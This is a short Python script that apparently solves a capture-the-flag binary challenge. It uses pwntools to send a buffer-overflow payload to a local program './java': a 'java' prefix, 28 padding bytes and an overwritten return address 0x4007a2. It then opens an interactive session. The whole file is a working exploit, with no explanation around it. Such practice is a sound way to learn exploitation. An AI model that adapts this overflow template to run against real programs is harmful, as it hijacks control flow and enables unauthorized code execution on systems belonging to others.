#! /bin/python3

from pwn import *

address = p64(0x4007a2)
print(address)
msg = b'java' + b'b'*28 + address
print(msg)

p = process('./java')
p.sendline(msg)
p.interactive()
